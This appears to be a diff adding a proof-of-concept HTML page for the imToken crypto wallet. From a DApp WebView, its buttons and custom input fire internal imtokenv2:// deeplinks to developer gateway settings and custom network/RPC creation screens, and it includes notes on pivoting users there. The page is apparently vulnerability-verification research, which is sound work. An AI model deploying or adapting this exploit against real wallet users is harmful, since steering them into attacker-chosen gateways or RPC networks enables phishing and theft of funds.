@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>imToken internal deeplink PoC</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f6f7fb;
+        --panel: #ffffff;
+        --text: #111827;
+        --muted: #6b7280;
+        --line: #d1d5db;
+        --accent: #0f766e;
+        --accent-2: #0b5ed7;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        padding: 24px;
+        background: linear-gradient(180deg, #eefbf8 0%, var(--bg) 35%);
+        color: var(--text);
+        font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+
+      main {
+        max-width: 920px;
+        margin: 0 auto;
+      }
+
+      h1 {
+        margin: 0 0 8px;
+        font-size: 28px;
+      }
+
+      p {
+        margin: 0 0 14px;
+        color: var(--muted);
+      }
+
+      .panel {
+        background: var(--panel);
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 16px;
+        margin-top: 16px;
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 12px;
+      }
+
+      button {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: #fff;
+        text-align: left;
+        cursor: pointer;
+        color: var(--text);
+      }
+
+      button strong {
+        display: block;
+        font-size: 15px;
+        margin-bottom: 4px;
+      }
+
+      button span {
+        color: var(--muted);
+        font-size: 12px;
+      }
+
+      button.primary {
+        background: var(--accent);
+        color: #fff;
+        border-color: var(--accent);
+      }
+
+      button.secondary {
+        background: var(--accent-2);
+        color: #fff;
+        border-color: var(--accent-2);
+      }
+
+      input,
+      textarea {
+        width: 100%;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 10px 12px;
+        font: inherit;
+      }
+
+      textarea {
+        min-height: 96px;
+        resize: vertical;
+      }
+
+      code,
+      pre {
+        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      }
+
+      pre {
+        margin: 12px 0 0;
+        padding: 12px;
+        border-radius: 8px;
+        background: #0f172a;
+        color: #e5e7eb;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>imToken internal deeplink PoC</h1>
+      <p>
+        This page triggers internal `imtokenv2://navigate/...` routes from inside
+        the DApp WebView, to verify that the browser allows arbitrary app screen
+        deeplinks without a screen whitelist.
+      </p>
+
+      <section class="panel">
+        <div class="grid">
+          <button
+            class="primary"
+            data-link="imtokenv2://navigate/DeveloperGatewaySetting"
+          >
+            <strong>Open DeveloperGatewaySetting</strong>
+            <span>Verify whether Gateway host picker can be opened from a DApp page</span>
+          </button>
+          <button
+            class="secondary"
+            data-link="imtokenv2://navigate/NetworkDetailCreate"
+          >
+            <strong>Open NetworkDetailCreate</strong>
+            <span>Verify whether custom network creation page is reachable</span>
+          </button>
+          <button
+            data-link="imtokenv2://navigate/DeveloperSettings"
+          >
+            <strong>Open DeveloperSettings</strong>
+            <span>Useful pivot if the app blocks the child page but not the parent</span>
+          </button>
+          <button
+            data-link="imtokenv2://navigate/DappView?url=https://token.im"
+          >
+            <strong>Control: Open DappView</strong>
+            <span>Confirms deeplink dispatch itself is functioning</span>
+          </button>
+        </div>
+      </section>
+
+      <section class="panel">
+        <p>Custom deeplink</p>
+        <input
+          id="customLink"
+          value="imtokenv2://navigate/DeveloperGatewaySetting"
+        />
+        <div class="grid" style="margin-top: 12px">
+          <button id="openCustom">
+            <strong>window.location.href</strong>
+            <span>Top-frame navigation from the current DApp page</span>
+          </button>
+          <button id="openBlank">
+            <strong>location.assign</strong>
+            <span>Alternate top-frame navigation path</span>
+          </button>
+        </div>
+      </section>
+
+      <section class="panel">
+        <p>Expected observations</p>
+        <textarea id="notes" readonly>
+1. If tapping these buttons opens internal screens, the DApp WebView can trigger arbitrary imtoken deeplinks.
+2. If DeveloperGatewaySetting opens, a DApp can at least pivot the user into the gateway host selector.
+3. If NetworkDetailCreate opens, a DApp can pivot the user into custom network/RPC creation.
+        </textarea>
+        <pre id="status">Ready.</pre>
+      </section>
+    </main>
+
+    <script>
+      const statusEl = document.getElementById('status');
+      const customLinkEl = document.getElementById('customLink');
+
+      function setStatus(message) {
+        statusEl.textContent = message;
+      }
+
+      function openLink(link, method) {
+        setStatus(
+          [
+            `method: ${method}`,
+            `link: ${link}`,
+            '',
+            'If the page disappears and an internal imToken screen opens, the deeplink was accepted by the DApp WebView path.'
+          ].join('\n')
+        );
+
+        if (method === 'href') {
+          window.location.href = link;
+          return;
+        }
+
+        window.location.assign(link);
+      }
+
+      document.querySelectorAll('[data-link]').forEach((button) => {
+        button.addEventListener('click', () => {
+          openLink(button.getAttribute('data-link'), 'preset');
+        });
+      });
+
+      document.getElementById('openCustom').addEventListener('click', () => {
+        openLink(customLinkEl.value.trim(), 'href');
+      });
+
+      document.getElementById('openBlank').addEventListener('click', () => {
+        openLink(customLinkEl.value.trim(), 'assign');
+      });
+    </script>
+  </body>
+</html>
